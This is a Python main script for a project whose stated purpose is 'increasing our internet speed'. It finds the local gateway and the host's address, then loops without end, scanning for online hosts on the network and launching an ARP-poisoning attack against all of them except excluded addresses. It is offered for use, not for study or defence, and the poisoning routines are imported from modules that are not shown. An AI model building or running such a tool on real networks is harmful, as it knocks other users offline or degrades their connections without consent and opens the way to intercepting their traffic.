"""
Authors: Noam Cohen & Ron Hodadedi
Purpose: Increasing our internet speed.
Description:
Note: This is the main file of the project.
"""
import optparse
import getDefaultGateway
import GetHostIp
import GetOnlineHosts
import ArpPoison


def main():
    # Parsing command-line options:
    parser = optparse.OptionParser("sudo python %prog")

    # Adding two options:
    # The network interface we want to speed up:
    parser.add_option('-i', '--interface', dest='interface', type='string', default='eth0')
    # specify IP address[es] to be excluded seperated by comma:
    parser.add_option('-e', '--exclude', dest='exclude', type='string')

    # Once all of our options are defined,
    # instruct optparse to parse program’s command line:
    (options, args) = parser.parse_args()

    interface = options.interface

    if options.exclude is None:
        exclusion = list()

    else:
        exclusion = options.exclude.split(',')

    # Put in router the default gateway:
    router = getDefaultGateway.get_def_gate(interface)
    # Get the network address in CIDR notation and the host IP:
    network, ip = GetHostIp.get_host_ip(interface)
    # Add our host to the exclusion list:
    exclusion += [router, ip]

    # Don't stop ever!! (-;
    while True:
        # Get only the hosts that are online:
        hosts = GetOnlineHosts.get_online_hosts(network, exclusion)
        # Call to ArpSpoofing attack:
        ArpPoison.arp_poison(hosts, router, interface)


if __name__ == "__main__":
    main()
